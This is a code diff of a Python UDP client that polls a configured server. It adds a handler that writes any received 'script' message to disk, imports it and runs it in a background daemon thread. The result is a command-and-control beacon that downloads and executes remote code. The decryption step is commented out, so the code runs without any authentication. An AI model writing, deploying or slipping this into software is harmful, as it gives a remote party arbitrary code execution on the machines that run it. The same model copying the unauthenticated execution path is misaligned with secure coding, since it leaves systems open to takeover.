@@ -1,11 +1,15 @@
 import asyncio
 import asyncudp
 
+import threading
+
+from cryptography.fernet import Fernet
+
 from message import Message, MessageTypes
 
 from utils import get_config
 
-IP, PORT = get_config()
+IP, PORT, KEY = get_config()
 
 global COUNT
 global queue
@@ -13,28 +17,39 @@ global queue
 COUNT = 0
 QUEUE = []
 
+fernet = Fernet(KEY)
 
-async def message_creator(flag):
+
+def exec_msg(msg: Message):
+    if msg.type == MessageTypes.RUN_ENCRYPTED_CODE:
+        # print(msg.data["script"])
+        # encrypted = bytes(msg.data["script"], encoding="latin-1")
+        # script = fernet.decrypt(encrypted)
+        script = msg.data["script"]
+        with open("got_script.py", "w") as f:
+            f.write(script)
+        
+        from got_script import run
+        t = threading.Thread(target=run, name="name", args=())
+        t.daemon = True
+        t.start()
+
+
+async def client(sock):
+    COUNT = 0
     while True:
         if len(QUEUE) == 0:
             QUEUE.append(Message(MessageTypes.REPEAT, data={"count": COUNT}))
-            flag.set()
-        # print("queue len is", len(QUEUE))
         await asyncio.sleep(0.1)
-
-
-async def client(sock, flag):
-    while True:
-        print("enters this loop")
-        await flag.wait()
         if len(QUEUE) > 0:
-            print("queue has an item")
             m_to_send = QUEUE.pop(0)
             sock.sendto(m_to_send.as_encoded())
 
         received, addr = await sock.recvfrom()
         msg_received = Message.from_encoded_str(received)
         print(msg_received)
+
+        exec_msg(msg_received)
 
         if msg_received.type == MessageTypes.QUIT:
             break
@@ -46,12 +61,7 @@ async def client(sock, flag):
 async def main():
     sock = await asyncudp.create_socket(remote_addr=(IP, PORT))
 
-    flag = asyncio.Event()
-
-    task = asyncio.create_task(message_creator(flag))
-    # await client(sock)
-
-    await asyncio.gather(task, client(sock, flag))
+    await client(sock)
 
     sock.close()
 
